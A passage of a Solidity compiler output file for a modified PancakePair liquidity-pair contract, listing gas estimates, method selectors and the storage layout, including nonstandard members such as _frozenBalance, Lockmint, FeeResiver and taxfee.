0x8B64736F6C63430005100032454950373132446F6D6169 PUSH15 0x28737472696E67206E616D652C7374 PUSH19 0x696E672076657273696F6E2C75696E74323536 KECCAK256 PUSH4 0x6861696E 0x49 PUSH5 0x2C61646472 PUSH6 0x737320766572 PUSH10 0x6679696E67436F6E7472 PUSH2 0x6374 0x29 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "1992400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"DOMAIN_SEPARATOR()": "1110",
						"FeeResiver()": "1082",
						"Lockmint(address)": "infinite",
						"MINIMUM_LIQUIDITY()": "309",
						"PERMIT_TYPEHASH()": "266",
						"_frozenBalance(address)": "1169",
						"allowance(address,address)": "1283",
						"approve(address,uint256)": "22366",
						"balanceOf(address)": "1170",
						"burn(address)": "infinite",
						"decimals()": "297",
						"factory()": "1104",
						"getReserves()": "1240",
						"initialize(address,address,uint256)": "62887",
						"kLast()": "1066",
						"mint(address)": "infinite",
						"name()": "infinite",
						"nonces(address)": "1214",
						"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "infinite",
						"price0CumulativeLast()": "1065",
						"price1CumulativeLast()": "1087",
						"skim(address)": "infinite",
						"swap(uint256,uint256,address,bytes)": "infinite",
						"symbol()": "infinite",
						"sync()": "infinite",
						"taxfee()": "1086",
						"token0()": "1105",
						"token1()": "1126",
						"totalSupply()": "1110",
						"transfer(address,uint256)": "infinite",
						"transferFrom(address,address,uint256)": "infinite"
					},
					"internal": {
						"_mintFee(uint112,uint112)": "infinite",
						"_safeTransfer(address,address,uint256)": "infinite",
						"_update(uint256,uint256,uint112,uint112)": "infinite"
					}
				},
				"methodIdentifiers": {
					"DOMAIN_SEPARATOR()": "3644e515",
					"FeeResiver()": "900820d8",
					"Lockmint(address)": "dcbbb373",
					"MINIMUM_LIQUIDITY()": "ba9a7a56",
					"PERMIT_TYPEHASH()": "30adf81f",
					"_frozenBalance(address)": "47d5d856",
					"allowance(address,address)": "dd62ed3e",
					"approve(address,uint256)": "095ea7b3",
					"balanceOf(address)": "70a08231",
					"burn(address)": "89afcb44",
					"decimals()": "313ce567",
					"factory()": "c45a0155",
					"getReserves()": "0902f1ac",
					"initialize(address,address,uint256)": "1794bb3c",
					"kLast()": "7464fc3d",
					"mint(address)": "6a627842",
					"name()": "06fdde03",
					"nonces(address)": "7ecebe00",
					"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "d505accf",
					"price0CumulativeLast()": "5909c0d5",
					"price1CumulativeLast()": "5a3d5493",
					"skim(address)": "bc25cf77",
					"swap(uint256,uint256,address,bytes)": "022c0d9f",
					"symbol()": "95d89b41",
					"sync()": "fff6cae9",
					"taxfee()": "f317739c",
					"token0()": "0dfe1681",
					"token1()": "d21220a7",
					"totalSupply()": "18160ddd",
					"transfer(address,uint256)": "a9059cbb",
					"transferFrom(address,address,uint256)": "23b872dd"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 19,
						"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
						"label": "totalSupply",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					},
					{
						"astId": 23,
						"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
						"label": "balanceOf",
						"offset": 0,
						"slot": "1",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 29,
						"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
						"label": "allowance",
						"offset": 0,
						"slot": "2",
						"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
					},
					{
						"astId": 33,
						"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
						"label": "_frozenBalance",
						"offset": 0,
						"slot": "3",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 35,
						"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
						"label": "DOMAIN_SEPARATOR",
						"offset": 0,
						"slot": "4",
						"type": "t_bytes32"
					},
					{
						"astId": 42,
						"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
						"label": "nonces",
						"offset": 0,
						"slot": "5",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 457,
						"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
						"label": "FeeResiver",
						"offset": 0,
						"slot": "6",
						"type": "t_address"
					},
					{
						"astId": 473,
						"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
						"label": "factory",
						"offset": 0,
						"slot": "7",
						"type": "t_address"
					},
					{
						"astId": 475,
						"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
						"label": "token0",
						"offset": 0,
						"slot": "8",
						"type": "t_address"
					},
					{
						"astId": 477,
						"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
						"label": "token1",
						"offset": 0,
						"slot": "9",
						"type": "t_address"
					},
					{
						"astId": 479,
						"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
						"label": "taxfee",
						"offset": 0,
						"slot": "10",
						"type": "t_uint256"
					},
					{
						"astId": 481,
						"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
						"label": "reserve0",
						"offset": 0,
						"slot": "11",
						"type": "t_uint112"
					},
					{
						"astId": 483,
						"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
						"label": "reserve1",
						"offset": 14,
						"slot": "11",
						"type": "t_uint112"
					},
					{
						"astId": 485,
						"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
						"label": "blockTimestampLast",
						"offset": 28,
						"slot": "11",
						"type": "t_uint32"
					},
					{
						"astId": 487,
						"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
						"label": "price0CumulativeLast",
						"offset": 0,
						"slot": "12",
						"type": "t_uint256"
					},
					{
						"astId": 489,
						"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
						"label": "price1CumulativeLast",
						"offset": 0,
						"slot": "13",
						"type": "t_uint256"
					},
					{
						"astId": 491,
						"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
						"label": "kLast",
						"offset": 0,
						"slot": "14",
						"type": "t_uint256"
					},
					{
						"astId": 494,
						"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
						"label": "unlocked",
						"offset": 0,
						"slot": "15",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_bytes32": {
						"encoding": "inplace",
						"label": "bytes32",
						"numberOfBytes": "32"
					},
					"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => mapping(address => uint256))",
						"numberOfBytes": "32",
						"value": "t_mapping(t_address,t_uint256)"
					},
					"t_mapping(t_address,t_uint256)": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => uint256)",
						"numberOfBytes": "32",
						"value": "t_uint256"
					},
					"t_uint112": {
						"encoding": "inplace",
						"label": "uint112",
						"numberOfBytes": "14"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					},
					"t_uint32": {
						"encoding": "inplace",
						"label": "uint32",
						"numberOfBytes": "4"
					}
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}